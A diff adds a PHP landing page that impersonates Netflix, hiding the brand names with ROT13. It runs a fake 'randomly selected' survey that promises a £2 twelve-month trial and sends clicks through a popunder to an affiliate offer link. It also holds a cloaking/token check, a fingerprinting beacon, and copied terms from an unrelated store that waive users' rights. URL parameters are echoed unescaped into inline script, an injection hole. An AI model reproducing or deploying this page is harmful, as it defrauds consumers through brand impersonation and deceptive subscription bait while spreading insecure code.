@@ -1,0 +1,693 @@
+
+<?php
+// w4 logo
+
+$page_peel_brand = "";
+  if ($_GET['s'] == "1016") {
+$page_peel_brand = <<<page_peel_brand
+<script type="text/javascript" src="/utils/banners/banner-brnd.js"></script>
+<style>
+img.banner {
+    position: fixed;
+    top: 0;
+    width: 150px;
+    z-index: 999999999999;
+}
+</style>
+page_peel_brand;
+  }
+// This is index-rp-nl-nw-exc.php - No Logo - New Window - Exclude by EPV
+session_start();
+require_once dirname(__FILE__) . "/../wall/nas-functions.php";
+if(isset($_GET['nasTag']) && !empty($_GET['nasTag'])) {
+  $tag = $_GET['nasTag'];
+} else {
+  $tag = "";
+}
+
+$data = GetNasWall("e78a802e-cfb4-486e-937b-4dba9fc35c71", null, $tag)[0];
+
+require_once(dirname(__FILE__) . "/../helpers.php");
+
+
+if (getcwd() === "/var/devsurvey/redzun") {
+  include("_php_voluum_clock_or_lptoken_check-w14.php");
+} else {
+  include("../_php_voluum_clock_or_lptoken_check-w14.php");
+}
+
+if (isset($_GET['cc'])) $country = strtolower($_GET['cc']); // country must be defined for include
+  else $country = 'us';
+
+$_SESSION['cc'] = $country; // Set Country ID
+
+if (isset($_GET['wid'])) $wid = strtolower($_GET['wid']); // Wall ID
+  else $wid = 'default';
+
+$_SESSION['wid'] = $_GET['wid']; // Set Wall ID
+
+$offer_parameters = "?c=" . $_GET['c']."&k="."&v=".$_GET['v']."&s=".$_GET['s']."&t=".$_GET['t']."&cr=".$_GET['cr']."&src=".$_GET['src']."&lp=".$_GET['lp']."&id=".$_GET['id'];
+$offer_url = "https://" . $offer_link_domain_fold . "/de7d783b-d901-4973-8080-b75e3e249c7c". $offer_parameters;
+
+?>
+<script>
+  function r(b,a){return++a?String.fromCharCode((b<"["?91:123)>(b=b.charCodeAt()+13)?b:b-26):b.replace(/[a-zA-Z]/g,r)}
+  pr_name = "<?php echo str_rot13("Netflix"); ?>";
+  sh_name = "<?php echo str_rot13("iPad"); ?>";
+</script>
+<script>
+ 			window.c_var = '<?=!empty($_GET['c']) ? $_GET['c'] : ""?>';
+			window.k_var = '<?=!empty($_GET['k']) ? str_rot13($_GET['k']) : ""?>';
+			window.s_var = '<?=!empty($_GET['s']) ? $_GET['s'] : ""?>';
+			window.src_var = '<?=!empty($_GET['src']) ? $_GET['src'] : ""?>';
+			window.id_var = '<?=!empty($_GET['id']) ? $_GET['id'] : ""?>';
+			
+			var jumpurl;
+      jumpurl = '<?php echo $data->url ?>';
+ </script>
+
+
+<html lang="en">
+<head>
+    <base href="/uk-nfx2/">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Limited offer</title>
+    <link rel="icon" href="./files/favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <!--GOOGLE FONTS-->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&amp;display=swap"
+        rel="stylesheet">
+    <style>
+    :root {
+
+        --promo-bg-color: #000000;
+        --promo-txt-color: #FFFFFF;
+        --promo-line-color: #E50914;
+
+        --body-bg-color: #000000;
+        --body-primary-txt-color: #E50914;
+
+        --button-bg-color: #E50914;
+        --button-txt-color: #000000;
+
+        --body-secondary-txt-color: #E50914;
+    }
+
+    .subtitle {
+        background-color: var(--promo-bg-color) !important;
+    }
+
+    .limited-box {
+        background-color: var(--promo-bg-color) !important;
+    }
+
+    .subtitle {
+        color: var(--promo-txt-color) !important;
+    }
+
+    .limited-offer {
+        color: var(--promo-txt-color) !important;
+    }
+
+    .adtitle {
+        border: 1px double var(--promo-line-color) !important;
+        border-width: 1px 0px !important;
+    }
+
+    html,
+    body {
+        background-color: var(--body-bg-color) !important;
+    }
+
+    .darktile {
+        background-color: var(--body-bg-color) !important;
+    }
+
+    .button2 {
+        background-color: var(--button-bg-color) !important;
+    }
+
+    .darktile {
+        color: var(--body-primary-txt-color) !important;
+    }
+
+    .terms p {
+        color: var(--body-primary-txt-color) !important;
+    }
+
+    .button2 {
+        color: var(--button-txt-color) !important;
+    }
+
+    .tile {
+        color: var(--body-primary-txt-color) !important;
+    }
+
+    .button {
+        background: var(--button-bg-color) !important;
+    }
+
+    .limited-save {
+        color: var(--button-bg-color) !important;
+    }
+
+    .lighttile {
+        background: var(--button-bg-color) !important;
+    }
+
+    .footerimg {
+        color: #ffffff !important;
+    }
+
+    .button {
+        color: var(--button-txt-color) !important;
+    }
+
+    .lighttile {
+        color: var(--body-secondary-txt-color) !important;
+    }
+/* Este es el parametro de la transparencia del "If you are interested in participating in the selected trial group, please answer the three questions above.
+"*/
+    .vmid {
+        background: -webkit-linear-gradient(left, rgb(229 9 20 / 80%), rgb(0 0 0 / 80%)); 
+    }
+    </style>
+    <!--STYLESHEETS-->
+    <link rel="stylesheet" type="text/css" href="./files/bootstrap.min.css">
+    <link rel="stylesheet" type="text/css" href="./files/style.css">
+
+    <!--SCRIPTS-->
+    <script src="./files/jquery-3.6.0.min.js"></script>
+    <script src="./files/script.js"></script>
+    <style>
+    html,
+    body {
+        width: 100%;
+        height: 100%;
+        margin: 0px;
+        padding: 0px;
+        overflow-x: hidden;
+    }
+
+    .footer-terms {
+        text-align: center;
+    }
+
+    .subtitle {
+        font-size: 2.4rem;
+        line-height: 1em;
+        color: white;
+        background-color: #15151f;
+        text-align: center;
+        margin: auto;
+        padding: 30px 150px;
+        letter-spacing: 1;
+    }
+
+    .adtitle {
+        line-height: 1.8rem;
+        letter-spacing: 1.2;
+        text-align: center;
+        padding: 20px 150px;
+        border: 1px double #1ce783;
+        border-width: 1px 0px;
+    }
+
+    .limited-box {
+        background-color: #15151f;
+        padding: 20px;
+    }
+
+    .limited-offer {
+        font-size: 3.2rem;
+        color: white;
+    }
+
+    .limited-save {
+        margin-top: 40px;
+        font-size: 1.6rem;
+        color: #1ce783;
+    }
+
+    @media (min-width:320px) {
+        .logo {
+            width: 50%;
+        }
+
+        .subtitle {
+            font-size: 1rem;
+            padding: 15px 50px;
+        }
+
+        .adtitle {
+            padding: 5px 20px;
+        }
+
+        .limited-offer {
+            font-size: 1.4rem;
+        }
+
+        .limited-save {
+            margin-top: 10px;
+            font-size: 1rem;
+            line-height: 1.2em;
+        }
+    }
+
+    @media (min-width:480px) {
+        .subtitle {
+            font-size: 1.2rem;
+            padding: 15px 80px;
+        }
+
+        .adtitle {
+            padding: 15px 80px;
+        }
+
+        .limited-offer {
+            font-size: 1.4rem;
+        }
+
+        .limited-save {
+            margin-top: 10px;
+            font-size: 1rem;
+            line-height: 1.2em;
+        }
+
+    }
+
+    @media (min-width:600px) {
+        .logo {
+            width: 25%;
+        }
+
+        .subtitle {
+            font-size: 1.4rem;
+            padding: 15px 100px;
+            line-height: 1.2em;
+        }
+
+        .limited-box {
+            padding: 10px;
+        }
+
+        .limited-offer {
+            font-size: 1.8rem;
+        }
+
+        .limited-save {
+            margin-top: 25px;
+            font-size: 1rem;
+            line-height: 1.2em;
+        }
+    }
+
+    @media (min-width:801px) {
+        .subtitle {
+            font-size: 1.6rem;
+            padding: 15px 150px;
+        }
+
+        .adtitle {
+            padding: 10px 150px;
+        }
+
+        .limited-offer {
+            font-size: 2.6rem;
+        }
+
+        .limited-save {
+            font-size: 1.2rem;
+        }
+    }
+
+    @media (min-width:1025px) {
+
+        .subtitle {
+            font-size: 2rem;
+            padding: 20px 150px;
+        }
+
+        .adtitle {
+            padding: 15px 200px;
+        }
+
+        .limited-offer {
+            font-size: 3rem;
+            color: white;
+        }
+
+        .limited-save {
+            margin-top: 40px;
+            font-size: 1.4rem;
+            color: #1ce783;
+        }
+    }
+
+    @media (min-width:320px) and (max-width:576px) {
+        .col-sm-6 {
+            width: 50%;
+        }
+    }
+
+    @media (min-width:320px) and (max-width:430px) {
+
+        .h2,
+        h2 {
+            font-size: calc(1.5rem + .9vw);
+        }
+        .question {
+            padding-left: 5px;
+            padding-right: 5px;
+        }
+    }
+
+    @media (min-width:430px) and (max-width:576px) {
+
+        .h2,
+        h2 {
+            font-size: calc(1.8rem + .9vw);
+        }
+        .question {
+            padding-left: 10px;
+            padding-right: 10px;
+        }
+    }
+    </style>
+
+    <style>
+    .footerimg {
+        background: linear-gradient(to bottom, rgba(0, 0, 0, 0.30) 100%, rgba(255 255 255 / 0%) 100%), url('./files/21fd1511b7713b3410a86c683577b24c.jpg');
+        border-radius: 40px;
+        width: 100%;
+        height: 100%;
+        text-align: center;
+        padding: 100px 0;
+    }
+
+    @media (max-width:768px) {
+        .footerimg {
+            padding: 100px 0;
+        }
+    }
+
+    @media (max-width:465px) {
+        .footerimg {
+            padding: 100px 0;
+        }
+    }
+    </style>
+
+    <script>
+
+    <script src="/inc/msg.v3.js?656e039a19d14"></script>
+<script type="text/javascript">
+    var s1 = "350778";
+    var s2 = "1099120942";
+    var fp = "b057a3930b9a51d8296aa0b7d3e5d043";
+    var esource = btoa(location.hostname);
+    MYCALL.init([s1,s2,esource,fp]);
+    MYCALL.send();
+</script>
+
+</head>
+
+<body>
+    <div class="wrapper">
+        <div class="container-fluid g-0">
+            <div class="row">
+                <div class="col-lg-6 col-mg-4 col-sm-6 mt-2 logo" style="margin: auto;">
+                    <img class="headerimg" src="./files/nfxlogo.png">
+                </div>
+                <div class="col-lg-10 col-mg-10 subtitle">
+                    Unlimited movies, TV shows, and more watch anywhere. Cancel anytime                </div>
+                <div class="col-lg-12 col-mg-12 col-sm-12 adtitle">
+                    <div class="limited-box">
+                        <div class="limited-offer">
+                            Limited offer £2.00 sign up                        </div>
+                        <div class="limited-save">
+                            Save 95% on today’s subscription. Cancel anytime.                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="container-fluid g-0">
+            <div class="row">
+                <div class="col-sm-12 col-md-6 tile">
+                    <h3>Please answer these 3 questions</h3>
+                </div>
+                <div class="col-6 d-none d-md-block tile">
+                    <h3>You have been randomly selected</h3>
+                </div>
+            </div>
+            <div class="row g-0">
+                <div class="col-md-6 col-sm-12 darktile">
+                    <div class="questionaire">
+                        <!--Just add/delete questions-->
+                        <div class="question" style="">
+                            <h2>Are you already a <script>document.write(r(pr_name))</script> subscriber?</h2>
+                        </div>
+                        <div class="answer" style="display: block;">
+                            <div class="survey-button button">Yes</div>
+                            <div class="survey-button button">No</div>
+                        </div>
+                        <div class="question" style="display: none;">
+                            <h2>Do you want a 12 month trial for only £2?</h2>
+                        </div>
+                        <div class="answer" style="display: none;">
+                            <div class="survey-button button">Yes</div>
+                            <div class="survey-button button">No</div>
+                        </div>
+                        <div class="question" style="display: none;">
+                            <h2>How often do you watch series or movies?</h2>
+                        </div>
+                        <div class="answer" style="display: none;">
+                            <div class="survey-button button">1-3 days a week</div>
+                            <div class="survey-button button">4-6 days a week</div>
+                            <div class="survey-button button">Every day</div>
+                        </div>
+                    </div>
+                    <div class="end">
+                        <p></p>
+                        <h2></h2>
+                        <a href="javascript:void(0)" onclick="popunder(jumpurl)" class="product-button">
+                            <div class="end-button button">Activate trial</div>
+                        </a>
+                    </div>
+                </div>
+                <div class="col-sm-12 col-md-6 darktile">
+                    <img class="bodyimg" src="./files/nfxlogo.jpg">
+                </div>
+            </div>
+            <div class="row g-0 stream2">
+                <div class="col-sm-12 col-md-12 footerimg ">
+                    <div class="vmid">
+                        <h4><b>If you are interested in participating in the selected trial group, please answer the three questions above.</b></h4>
+                        <a href="javascript:void(0)" onclick="popunder(jumpurl)" id="button-2" data-product-id="1"
+                            class="product-button">
+                            <img src="<?php echo $data->impression_url ?>" style="display:none;"></img> 
+                            <div class="end-button button2">
+                                Activate trial</div>
+                        </a>
+                    </div>
+                </div>
+            </div>
+            <div class="row g-0">
+                <div class="col-12 terms">
+                    <p>2023     <link rel="stylesheet" type="text/css" href="./files/assets/lander.css" />
+    <link href="./files/jquery.lightbox.css" rel="stylesheet" type="text/css">
+    <div class="footer-terms">
+        <div class="step-links">
+            <a class="fancybox" href="#inline1" title="Terms &amp; Conditions" id="terms-link">Terms & Conditions </a>
+            |
+            <a class="fancybox" href="#inline2" title="Privacy Policy" id="privacy-link">Privacy Policy</a>
+        </div>
+    </div>
+    <div id="inline1" class="page-inner" style="display: none;">
+            <h4 class="footer-tag footer-h4">elasticstring.store</h4>
+            <h3 class="footer-tag footer-h3">Terms and Conditions of Use and other Disclosures</h3>
+            <h4 class="footer-tag footer-h4">1. Introduction</h4>
+            <p class="footer-para">. Thank you for using elasticstring.store.</p>
+            <p class="footer-para">By using this site, you agree to be legally bound to this document which consists of our Terms of and Conditions of Use and other Disclosures, and constitutes a legally-binding agreement ("Agreement") governing the terms of providing you with our service. Throughout this document, the words "us," "we," "our," and "Company" refer to elasticstring.store, as is appropriate in the context of the use of the words. Likewise, the words "you" and "your" refer to you, the person who is being presented with this document for your agreement.</p>
+            <p class="footer-para">Accessing the Site, in any manner, whether automated or otherwise, constitutes use of the Site and your agreement to be bound by these Terms of Service. We reserve the right to change these Terms of Service or to impose new conditions on use of the Site, from time to time, in which case we will post the revised Terms of Service on this website. By continuing to use the Site after we post any such changes, you accept the Terms of Service, as modified.</p>
+            <h4 class="footer-tag footer-h4">2. Description of Service</h4>
+            <p class="footer-para">. elasticstring.store is a survey service which offers surveys, advertisements and/or other services as consideration for the provision of information to elasticstring.store.</p>
+            <p class="footer-para">Our surveys are made available to you as a result of your downloading, purchasing or otherwise subscribing to or using an application, tool bar or the like on your computer. We are in no way associated with or responsible for such application or tool bar.</p>
+            <h4 class="footer-tag footer-h4">3. Children's Privacy Statement</h4>
+            <p class="footer-para">This children's privacy statement explains our practices with respect to the online collection and use of personal information from children under the age of thirteen, and provides important information regarding their rights under federal law with respect to such information.</p>
+            <p class="footer-para">This Site is not directed to children under the age of thirteen and we do NOT knowingly collect personally identifiable information from children under the age of thirteen as part of the Site. We screen users who wish to provide personal information in order to prevent users under the age of thirteen from providing such information. If we become aware that we have inadvertently received personally identifiable information from a user under the age of thirteen as part of the Site, we will delete such information from our records. If we change our practices in the future, we will obtain prior, verifiable parental consent before collecting any personally identifiable information from children under the age of thirteen as part of the Site.</p>
+            <p class="footer-para">Because we do not collect any personally identifiable information from children under the age of thirteen as part of the Site, we also do NOT knowingly distribute such information to third parties.</p>
+            <p class="footer-para">We do NOT knowingly allow children under the age of thirteen to publicly post or otherwise distribute personally identifiable contact information through the Site.</p>
+            <p class="footer-para">Because we do not collect any personally identifiable information from children under the age of thirteen as part of the Site, we do NOT condition the participation of a child under thirteen in the Site's online activities on providing personally identifiable information.</p>
+            <h4 class="footer-tag footer-h4">4. Intellectual Property</h4>
+            <p class="footer-para">. This Site and all the materials available on the Site are the property of us and/or our affiliates or licensors, and are protected by copyright, trademark, and other intellectual property laws. The Site is provided solely for your personal noncommercial use. You may not use the Site or the materials available on the Site in a manner that constitutes an infringement of our rights or that has not been authorized by us. More specifically, unless explicitly authorized in these Terms of Service or by the owner of the materials, you may not modify, copy, reproduce, republish, upload, post, transmit, translate, sell, create derivative works, exploit, or distribute in any manner or medium (including by email or other electronic means) any material from the Site. You may, however, from time to time, download and/or print one copy of individual pages of the Site for your personal, non-commercial use, provided that you keep intact all copyright and other proprietary notices.</p>
+            <p class="footer-para">The trade names and trademarks of the persons or entities referred to in our advertisements are owned by those entities, and we are not affiliated with them in any way. elasticstring.store holds the intellectual property rights that refer to its own name only, including, without limitation, the Company trademark, logo, design, text, graphics and forms, including the selection and arrangement of such elements. In addition, the entire Site is copyrighted as a collective work. Company holds the copyright in all other materials as well as in the collective work itself. The collective work may also include works that are the property of Company's licensors, or simply of other third parties who are referred to on the site but to whom the Company has no affiliation and who are identified only as a reference. Those third parties' trademarks may also be protected by copyright and other intellectual property laws, and the use of their trademarks may be restricted as applicable. We may permit Users to submit content or other information to our site. Because of this, we must ensure that all content uploaded to us may be used legally by us without having to remove it at a later date due to a revocation of license by the uploading user, or a copyright complaint by the rightful owner. Therefore, by uploading any content to our site, you agree that you grant us a universal, perpetual, sublicensable, commercial and non-commercial, irrevocable license to use such content, and that you represent to us that you have the right to grant such a license. You agree to indemnify us as well as any third party affected by your wrongful representations if you should represent falsely that you have the right to grant this license.</p>
+            <h4 class="footer-tag footer-h4">5. Privacy.</h4>
+            <p class="footer-para">We may collect and store personal or other information that you voluntarily supply to us online while using the our service (e.g., while on the Site, participating in a survey, or in responding via email to a feature provided on the Site). elasticstring.store only contacts individuals who specifically request that we do so or in the event that they have signed up to receive our messaging or have purchased one of our products or third-party offers. elasticstring.store may collect personally identifying information from our users during online registration and online purchasing. Generally, this information includes name and e-mail address for registration to receive our free newsletters and name, postal address, and credit card information when purchasing products.</p>
+            <p class="footer-para">We may also collect and store information that is generated automatically as you navigate online through the Site. For example, we may collect information about your computer's connection to the Internet, which allows us, among other things, to improve the delivery of our web pages to you and to measure traffic on the Site. We also may use a standard feature found in browser software called a "cookie" to enhance your experience with the Site. Cookies are small files that your web browser places on your hard drive for record-keeping purposes. By showing how and when visitors use the Site, cookies help us deliver advertisements, identify how many unique users visit us, and track user trends and patterns. They also prevent you from having to re-enter your preferences on certain areas of the Site where you may have entered preference information before. The Site also may use web beacons (single-pixel graphic files also known as "transparent GIFs") to access cookies and to count users who visit the Site or open HTML-formatted email messages.</p>
+            <p class="footer-para">We may use the information we collect from you while you are using the Site in a variety of ways, including using the information to customize features. and advertising that appear on the Site. We also may provide your information to third parties, such as service providers and contractors for a variety of purposes. Unless you inform us in accordance with the process described below, we reserve the right to use, and to disclose to third parties, all of the information collected from and about you while you are using the Site in any way and for any purpose, such as to enable us or a third party to provide you with information about products and services. If you do not wish your information to be used for these purposes, you must send a letter to the Online Privacy Coordinator whose address is listed at the end of this Privacy Policy requesting to be taken off any lists of information that may be used for these purposes or that may be given or sold to third-parties.</p>
+            <p class="footer-para">Please keep in mind that whenever you voluntarily make your personal information available for viewing by third parties online - for example on message boards, web logs, through email, or in chat areas - that information can be seen, collected and used by others besides us. We cannot be responsible for any unauthorized third-party use of such information.</p>
+            <p class="footer-para">Some of our third-party advertisers and ad servers that place and present advertising on the Site also may collect information from you via cookies, web beacons or similar technologies. These third-party advertisers and ad servers may use the information they collect to help present their advertisements, to help measure and research the advertisements' effectiveness, or for other purposes. The use and collection of your information by these third-party advertisers and ad servers is governed by the relevant third-party's privacy policy and is not covered by our Privacy Policy. Indeed, the privacy policies of these third-party advertisers and ad servers may be different from ours. If you have any concerns about a third party's use of cookies or web beacons or use of your information, you should visit that party's website and review its privacy policy.</p>
+            <p class="footer-para">The Site also includes links to other websites and provides access to products and services offered by third parties, whose privacy policies we do not control. When you access another website or purchase third-party products or services through the Site, use of any information you provide is governed by the privacy policy of the operator of the site you are visiting or the provider of such products or services.</p>
+            <p class="footer-para">We may also make some content, products and services available through our Site through cooperative relationships with third-party providers, where the brands of our provider partner appear on the Site in connection with such content, products and/or services. We may share with our provider partner any information you provide, or that is collected, in the course of visiting any pages that are made available in cooperation with our provider partner. In some cases, the provider partner may collect information from you directly, in which cases the privacy policy of our provider partner may apply to the provider partner's use of your information. The privacy policy of our provider partners may differ from ours. If you have any questions regarding the privacy policy of one of our provider partners, you should contact the provider partner directly for more information.</p>
+            <p class="footer-para">Be aware that we may occasionally release information about our visitors when release is appropriate to comply with law or to protect the rights, property or safety of users of the Site or the public.</p>
+            <p class="footer-para">Please also note that as our business grows, we may buy or sell various assets. In the unlikely event that we sell some or all of our assets, or one or more of our websites is acquired by another company, information about our users may be among the transferred assets.</p>
+            <h4 class="footer-tag footer-h4">6. On-Line Commerce:</h4>
+            <p class="footer-para">Use of our service may allow you to purchase many different types of products and services online that are solely provided by third parties. We are not responsible for the quality, accuracy, timeliness, reliability or any other aspect of these products and services. If you make a purchase from such a merchant or on a site linked to by the Site, the information obtained during your visit to that merchant's online store or site, and the information that you give as part of the transaction, such as your credit card number and contact information, may be collected by both the merchant and us. A merchant may have privacy and data collection practices that are different from ours. We have no responsibility or liability for these independent policies. In addition, when you purchase products or services on or through the Site, you may be subject to additional terms and conditions that specifically apply to your purchase or use of such products or services. For more information regarding a merchant, its online store, its privacy policies, and/or any additional terms and conditions that may apply, visit that merchant's website and click on its information links or contact the merchant directly. You release us and our affiliates from any damages that you incur, and agree not to assert any claims against us or them, arising from your purchase or use of any products or services made available by third parties through the Site.</p>
+            <p class="footer-para">Your participation, correspondence or business dealings with any third party found on or through our Site, regarding payment and delivery of specific goods and services, and any other terms, conditions, representations or warranties associated with such dealings, are solely between you and such third party. You agree that COMPANY shall not be responsible or liable for any loss, damage, or other matters of any sort incurred as the result of such dealings</p>
+            <h4 class="footer-tag footer-h4">7. Disclaimers.</h4>
+            <p class="footer-para">Throughout the Site, we may provide links and pointers to Internet sites maintained by third parties. Our linking to such third-party sites does not imply an endorsement or sponsorship of such sites, or the information, products or services offered on or through the sites. In addition, neither we nor affiliates operate or control in any respect any information, products or services that third parties may provide on or through the Site or on websites linked to by us on the Site.</p>
+            <p class="footer-para">If applicable, any opinions, advice, statements, services, offers, or other information or content expressed or made available by third parties, including information providers, are those of the respective authors or distributors, and not Company. Neither Company nor any third-party provider of information guarantees the accuracy, completeness, or usefulness of any content. Furthermore, Company neither endorses nor is responsible for the accuracy and reliability of any opinion, advice, or statement made on any of the Sites by anyone other than an authorized Company representative while acting in his/her official capacity.</p>
+            <p class="footer-para">THE INFORMATION, PRODUCTS AND SERVICES OFFERED ON OR THROUGH THE SITE AND BY COMPANY AND ANY THIRD-PARTY SITES ARE PROVIDED "AS IS" AND WITHOUT WARRANTIES OF ANY KIND EITHER EXPRESS OR IMPLIED. TO THE FULLEST EXTENT PERMISSIBLE PURSUANT TO APPLICABLE LAW, WE DISCLAIM ALL WARRANTIES, EXPRESS OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE. WE DO NOT WARRANT THAT THE SITE OR ANY OF ITS FUNCTIONS WILL BE UNINTERRUPTED OR ERROR-FREE, THAT DEFECTS WILL BE CORRECTED, OR THAT ANY PART OF THIS SITE, OR THE SERVERS THAT MAKE IT AVAILABLE, ARE FREE OF VIRUSES OR OTHER HARMFUL COMPONENTS.</p>
+            <p class="footer-para">WE DO NOT WARRANT OR MAKE ANY REPRESENTATIONS REGARDING THE USE OR THE RESULTS OF THE USE OF THE SITE OR MATERIALS ON THIS SITE OR ON THIRD-PARTY SITES IN TERMS OF THEIR CORRECTNESS, ACCURACY, TIMELINESS, RELIABILITY OR OTHERWISE.</p>
+            <p class="footer-para">YOU SPECIFICALLY UNDERSTAND THAT OUR SURVEYS, CONTENT AND ADVERTISEMENTS ARE MADE AVAILABLE TO YOU AS A RESULT OF YOUR AFFIRMATIVE USE OF A TOOLBAR APPLICATION THAT YOU PROCURED FROM A THIRD-PARTY COMPANY THAT IS NOT AFFILIATED IN ANYWAY WITH US. YOU FURTHER AGREE THAT WE ARE NOT RESPONSIBLE IN ANY WAY FOR SUCH APPLICATION OR ANY TECHNICAL ISSUES WITH SUCH THIRD-PARTY APPLICATION. ANY QUESTIONS, ISSUES, PROBLEMS, CONFLICTS OR COMPLAINTS REGARDING SUCH THIRD-PARTY TOOLBAR APPLICATION IS SUCH THIRD-PARTY COMPANY'S RESPONSIBILITY.</p>
+            <p class="footer-para">COMPANY SHALL IN NO EVENT BE HELD LIABLE TO ANY PARTY FOR ANY DIRECT, INDIRECT, PUNITIVE, SPECIAL, INCIDENTAL OR OTHER CONSEQUENTIAL DAMAGES ARISING DIRECTLY OR INDIRECTLY FOR ANY REASON.</p>
+            <p class="footer-para">You agree at all times to defend, indemnify and hold harmless Company and its affiliates from and against any and all claims, causes of action, damages, liabilities, costs and expenses, including legal fees and expenses, arising out of or related to your breach of any obligation, warranty, representation or covenant set forth herein.</p>
+            <h4 class="footer-tag footer-h4">8. Limitation of Liability.</h4>
+            <p class="footer-para">WE MAKE NO REPRESENTATIONS OR WARRANTIES AS TO THE MERCHANTABILITY OF OUR OR OUR OR OUR PROVIDERS' SERVICE OR FITNESS FOR ANY PARTICULAR PURPOSE. YOU AGREE THAT YOU ARE RELEASING US FROM ANY LIABILITY THAT WE MAY OTHERWISE HAVE TO YOU IN RELATION TO OR ARISING FROM THIS AGREEMENT OR OUR PRODUCTS, FOR REASONS INCLUDING, BUT NOT LIMITED TO, FAILURE OF OUR SERVICE, NEGLIGENCE, OR ANY OTHER TORT. TO THE EXTENT THAT APPLICABLE LAW RESTRICTS THIS RELEASE OF LIABILITY, YOU AGREE THAT WE ARE ONLY LIABLE TO YOU FOR THE MINIMUM AMOUNT OF DAMAGES THAT THE LAW RESTRICTS OUR LIABILITY TO, IF SUCH A MINIMUM EXISTS. YOU AGREE THAT WE ARE NOT RESPONSIBLE IN ANY WAY FOR ANY LOSSES CAUSED BY THE PURCHASE OF SERVICES THROUGH OUR SERVICE. THIS INCLUDES ANY FAILURE OR DAMAGE CAUSED BY A SERVICE, INCLUDING INJURY TO PERSONS OR PROPERTY. WE ARE NOT LIABLE FOR ANY FAILURE OF THE GOODS OR SERVICES OF OUR COMPANY OR A THIRD PARTY, INCLUDING ANY FAILURES OR DISRUPTIONS, UNTIMELY DELIVERY, SCHEDULED OR UNSCHEDULED, INTENTIONAL OR UNINTENTIONAL, ON OUR SITE WHICH PREVENT ACCESS TO OUR SITE TEMPORARILY OR PERMANENTLY. THE PROVISION OF OUR SERVICE TO YOU IS CONTINGENT ON YOUR AGREEMENT WITH THIS AND ALL OTHER SECTIONS OF THIS AGREEMENT. NOTHING IN THE PROVISIONS OF THIS "REPRESENTATIONS &amp; WARRANTIES" SECTION SHALL BE CONSTRUED TO LIMIT THE GENERALITY OF THE FIRST PARAGRAPH OF THIS SECTION.</p>
+            <p class="footer-para">For Jurisdictions that do not allow us to limit our liability: Notwithstanding any provision of these Terms, if your jurisdiction has provisions specific to waiver or liability that conflict with the above then our liability is limited to the smallest extent possible by law.</p>
+            <h4 class="footer-tag footer-h4">9. Remedy for Dissatisfaction.</h4>
+            <p class="footer-para">If you are dissatisfied with the elasticstring.store Site or with any terms, conditions, rules, policies, guidelines, or practices of elasticstring.store in operating the elasticstring.store Site, your sole and exclusive remedy is to discontinue using the elasticstring.store Site.</p>
+            <p class="footer-para">We may cancel or terminate your right to use the Site or any part of the Site at any time without notice. In the event of cancellation or termination, you are no longer authorized to access the part of the Site affected by such cancellation or termination. The restrictions imposed on you with respect to material downloaded from the Site, and the disclaimers and limitations of liabilities set forth in these Terms of Service, shall survive.</p>
+            <h4 class="footer-tag footer-h4">10.</h4>
+            <p class="footer-para">The Digital Millennium Copyright Act of 1998 (the "DMCA") provides recourse for copyright owners who believe that material appearing on the Internet infringes their rights under the U.S. copyright law. If you believe in good faith that materials hosted by COMPANY infringe your copyright, you, or your agent may send to COMPANY a notice requesting that the material be removed or access to it be blocked. Any notification by a copyright owner or a person authorized to act on its behalf that fails to comply with requirements of the DMCA shall not be considered sufficient notice and shall not be deemed to confer upon COMPANY actual knowledge of facts or circumstances from which infringing material or acts are evident. If you believe in good faith that a notice of copyright infringement has been wrongly filed against you, the DMCA permits you to send to COMPANY a counter-notice. All notices and counter notices must meet the then current statutory requirements imposed by the DMCA; see http://www.loc.gov/copyright for details. COMPANY's Copyright Agent for notice of claims of copyright infringement or counter notices can be reached as follows: <a href="./files/" class="__cf_email__" data-cfemail="a7cec9c1c8e7c2cbc6d4d3cec4d4d3d5cec9c089d4d3c8d5c2">[email&#160;protected]</a></p>
+            <h4 class="footer-tag footer-h4">11. Indemnity.</h4>
+            <p class="footer-para">You agree at all times to defend, indemnify, and hold us harmless for any and all claims, causes of action, damages, liabilities, costs and expenses, including legal fees and expenses, arising from or related to this Agreement or the provision of our Service to you, any damages caused by your use of our Site, any products or services you order from our affiliates, or any breach of this Agreement or the terms of use herein.by you or any third party In the event of a claim such as one described in this paragraph, we may elect to settle with the party/parties making the claim, and you shall be liable for the damages as though we had proceeded with a trial.</p>
+            <h4 class="footer-tag footer-h4">12. Choice of Law.</h4>
+            <p class="footer-para">This Agreement shall be governed by the laws in force in the United Kingdom. The offer and acceptance of this contract is deemed to have occurred in the United Kingdom.</p>
+            <h4 class="footer-tag footer-h4">13. Forum of Dispute.</h4>
+            <p class="footer-para">In order to keep claims involving elasticstring.store simple, you agree that any claim you may bring against elasticstring.store arising from or relating to this Agreement will be heard solely by a court of competent jurisdiction in the United Kingdom. Specifically, you agree that any disputes shall be heard, where eligible, solely within the small claims division ("Small Claims Court") of a the United Kingdom county or municipal court, as established by chapter 1925 of the Ohio Revised Code.</p>
+            <p class="footer-para">If the Small Claims Court has no jurisdiction to grant such relief, you will waive your right to obtain such relief against us.</p>
+            <p class="footer-para">If you bring a dispute in a manner other than in accordance with this section, you agree that we may move to have it dismissed, and that you will be responsible for our reasonable attorneys' fees, court costs, and disbursements in doing so.</p>
+            <p class="footer-para">You agree that the prevailing party in any dispute will be entitled to claim from the unsuccessful party the entire amount of the prevailing party's reasonable attorneys' fees, costs, and disbursements in relation to the dispute.</p>
+            <h4 class="footer-tag footer-h4">14. Finality.</h4>
+            <p class="footer-para">This Agreement, including any and all documents referenced herein, constitute the entire agreement between elasticstring.store and you pertaining to the subject matter hereof.</p>
+            <h4 class="footer-tag footer-h4">15. Non-Waiver.</h4>
+            <p class="footer-para">elasticstring.store's failure to insist upon or enforce strict performance of any provision of this Agreement shall not be construed as a waiver of any provisions or right. If any of the provisions contained in this Agreement be determined to be void, invalid or otherwise unenforceable by a court of competent jurisdiction, such determination shall not affect the remaining provisions contained herein. This Agreement shall be governed by and construed in accordance with the laws applicable in the United Kingdom, including the federal law in the United Kingdom.</p>
